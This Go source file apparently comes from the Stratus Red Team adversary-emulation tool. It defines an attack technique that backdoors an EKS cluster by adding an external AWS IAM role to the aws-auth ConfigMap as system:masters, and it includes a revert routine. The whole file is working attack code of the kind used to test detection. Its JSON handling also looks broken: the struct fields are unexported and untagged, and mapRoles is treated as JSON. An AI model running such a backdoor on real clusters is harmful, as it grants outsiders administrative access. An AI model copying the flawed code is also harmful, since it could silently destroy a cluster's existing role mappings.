package kubernetes

import (
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.persistence.backdoor-awsauth-configmap",
		FriendlyName:       "Backdoor AWSAuth Configmap",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Description: `
Establishes persistence by modifiying the AwsAuth Configmap to allow a role in an external AWS to access the cluster with Administrative permissions. This technique is only applicable to AWS EKS Managed Kuberenetes clusters, or clusters where the AWS IAM Authenticator for Kubernetes is installed.

Warm-up: None

Detonation: 

- Check if the aws-auth ConfigMap exists
- Query the existing AwsAuth ConfigMap
- Update the aws-auth ConfigMap to map a role on an external, fictional AWS Account to auth to the cluster as system:master
`,
		Detonate: detonate,
		Revert:   revert,
	})
}

// aws-auth configmap is in the kube-system namespace
const namespace = "kube-system"

const configmapName = "aws-auth"

// Fake Malicious Role
const rolearn = "arn:aws:iam::111111111111:role/malicious-iam-role"

//structure of role mapping used in the aws-auth configmap
type roleMapping struct {
	rolearn  string
	username string
	groups   []string
}

//
var maliciousRoleMap = roleMapping{
	rolearn:  rolearn,
	username: rolearn,
	groups:   []string{"system:masters"},
}

func detonate(map[string]string) error {
	client := providers.K8s().GetClient()
	ctx := context.Background()

	log.Println("Checking for existing aws-auth configmap!")

	configmap, err := client.CoreV1().ConfigMaps(namespace).Get(ctx, configmapName, metav1.GetOptions{})
	if configmap.Data != nil {
		fmt.Println("aws-auth configmap found!")
		var maliciousConfigMap, err = addMaliciousRole(configmap)
		//fmt.Println(maliciousConfigMap)
		if err != nil {
			return errors.New(err.Error())
		}
		fmt.Println("adding malicious IAM role to system:masters mapping")
		_, err = client.CoreV1().ConfigMaps(namespace).Update(ctx, maliciousConfigMap, metav1.UpdateOptions{})
		if err != nil {
			return errors.New(err.Error())
		}
		return nil

	}
	if err != nil {
		return errors.New(err.Error())
	}
	return errors.New("aws-auth configmap not found - is this an EKS Cluster?")
}

func addMaliciousRole(configmap *corev1.ConfigMap) (*corev1.ConfigMap, error) {

	var parsedConfMap, err = parseConfigMap(configmap)
	var serializedJson []byte
	parsedConfMap = append(parsedConfMap, maliciousRoleMap)
	serializedJson, err = json.Marshal(parsedConfMap)
	configmap.Data["mapRoles"] = string(serializedJson)

	return configmap, err

}

func parseConfigMap(configmap *corev1.ConfigMap) ([]roleMapping, error) {
	var result []roleMapping
	var err = json.Unmarshal([]byte(configmap.Data["mapRoles"]), &result)
	return result, err
}

func revert(map[string]string) error {

	client := providers.K8s().GetClient()
	ctx := context.Background()

	configmap, err := client.CoreV1().ConfigMaps(namespace).Get(ctx, configmapName, metav1.GetOptions{})
	if err != nil {
		return errors.New(err.Error())
	}

	parsedConfigMap, err := parseConfigMap(configmap)
	if err != nil {
		return errors.New(err.Error())
	}

	for k, v := range parsedConfigMap {
		//fmt.Println(k, v)
		if v.rolearn == rolearn {
			parsedConfigMap = append(parsedConfigMap[:k], parsedConfigMap[k+1:]...)
		}
	}

	var serializedJson []byte
	serializedJson, err = json.Marshal(parsedConfigMap)
	if err != nil {
		return errors.New(err.Error())
	}
	configmap.Data["mapRoles"] = string(serializedJson)
	_, err = client.CoreV1().ConfigMaps(namespace).Update(ctx, configmap, metav1.UpdateOptions{})
	if err != nil {
		return errors.New(err.Error())
	}
	return nil
}
